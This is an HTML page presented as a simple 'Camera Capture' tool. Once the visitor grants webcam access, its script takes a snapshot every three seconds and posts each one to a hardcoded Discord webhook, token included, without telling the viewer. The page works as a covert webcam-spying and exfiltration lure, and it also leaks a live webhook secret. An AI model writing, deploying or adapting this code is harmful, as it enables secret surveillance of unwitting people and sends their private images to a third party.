<!DOCTYPE html>
<html>
<head>
	<title>Camera Capture</title>
	<script type="text/javascript">
		var img = null;

		function captureImage() {
			var video = document.getElementById('video');
			var canvas = document.createElement('canvas');
			canvas.width = video.videoWidth;
			canvas.height = video.videoHeight;
			var context = canvas.getContext('2d');
			context.drawImage(video, 0, 0, canvas.width, canvas.height);
			img = canvas.toDataURL('image/jpeg');
			setTimeout(captureImage, 3000); // capture image every 3 seconds
		}

		function sendToWebhook() {
			if (img != null) {
				var data = {
					"content": img
				};
				var xhr = new XMLHttpRequest();
				xhr.open("POST", "https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa", true);
				xhr.setRequestHeader('Content-Type', 'application/json');
				xhr.send(JSON.stringify(data));
				var fileData = btoa(img.slice(22)); // extract Base64-encoded data from image data URL
				var fileContent = "data:image/jpeg;base64," + fileData;
				var file = new File([fileContent], "image.txt", { type: "text/plain;charset=utf-8" });
				var formData = new FormData();
				formData.append("file", file);
				var xhrFile = new XMLHttpRequest();
				xhrFile.open("POST", "https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa", true);
				xhrFile.send(formData);
			}
		}
	</script>
</head>
<body onload="captureImage(); setInterval(sendToWebhook, 3000);">
	<video id="video" width="640" height="480" autoplay></video>
	<script type="text/javascript">
		navigator.mediaDevices.getUserMedia({ video: true })
			.then(function(stream) {
				var video = document.getElementById('video');
				video.srcObject = stream;
			})
			.catch(function(error) {
				console.log('Error: ' + error);
			});
	</script>
</body>
</html>
